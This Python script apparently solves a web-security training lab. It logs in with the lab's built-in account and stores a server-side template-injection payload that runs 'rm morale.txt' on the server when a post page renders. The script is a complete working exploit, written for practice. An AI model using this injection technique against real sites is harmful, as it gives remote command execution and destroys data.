import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Basic server-side template injection"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the login page and get the CSRF token and session cookie to login\n2. login as wiener and fetch his profile\n3. Set the preferred name with the malicious payload\n4. Post a comment as wiener\n5. Fetch the post page to execute the payload\n""")

    print(Fore.WHITE + "[1] Fetching the login page")
    try:
        login_page = requests.get(
            f"{url}/login", allow_redirects=False, verify=False, proxies=proxies)
        print(Fore.GREEN + "login page fetched")
    except:
        print(Fore.RED + "[!] Failed to fetch")

    print(Fore.WHITE + "[2] Extracting the csrf token and session")
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
    print(Fore.WHITE + "[+] CSRF token: " + Fore.YELLOW + csrf_token)

    print(Fore.WHITE + "[3] login as wiener")

    data = {"username": "wiener", "password": "peter", "csrf": csrf_token}
    cookies = {"session": session}
    try:
        wiener_login = requests.post(
            f"{url}/login", data=data, cookies=cookies, allow_redirects=False, verify=False, proxies=proxies)
        print(Fore.GREEN + "login as wiener")
    except:
        print(Fore.RED + "[!] Failed to fetch")

    print(Fore.WHITE + "[4] fetching wiener profile")
    session = wiener_login.cookies.get("session")
    cookies = {"session": session}
    try:
        wiener_profile = requests.get(
            f"{url}/my-account", cookies=cookies, allow_redirects=False, verify=False, proxies=proxies)
    except:
        print(Fore.RED + "[!] Failed to fetch")

    print(Fore.WHITE +
          "[5] Setting the preferred name with the malicious payload")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", wiener_profile.text)[0]
    payload = r"""user.first_name}}{%import os;os.system('rm morale.txt')%}"""
    data = {"csrf": csrf_token, "blog-post-author-display": payload}
    try:
        requests.post(
            f"{url}/my-account/change-blog-post-author-display", data=data, cookies=cookies, allow_redirects=False, verify=False, proxies=proxies)
    except:
        print(Fore.RED + "[!] Failed to fetch")

    print(Fore.WHITE + "[6] Posting a comment as wiener")
    data = {"postId": "1",
            "comment": "to execute the malicious payload", "csrf": csrf_token}
    try:
        requests.post(
            f"{url}/post/comment", data=data, cookies=cookies, allow_redirects=False, verify=False, proxies=proxies)
    except:
        print(Fore.RED + "[!] Failed to fetch")

    print(Fore.WHITE + "[7] Fetch the post page to execute the payload")
    try:
        requests.get(
            f"{url}/post?postId=1", cookies=cookies, allow_redirects=False, verify=False, proxies=proxies)
        print(Fore.WHITE + "The morale.txt file is successfully deleted")
        return True
    except Exception as e:
        print(f"[!] Failed to check stock with the injected payload through exception")
        return False
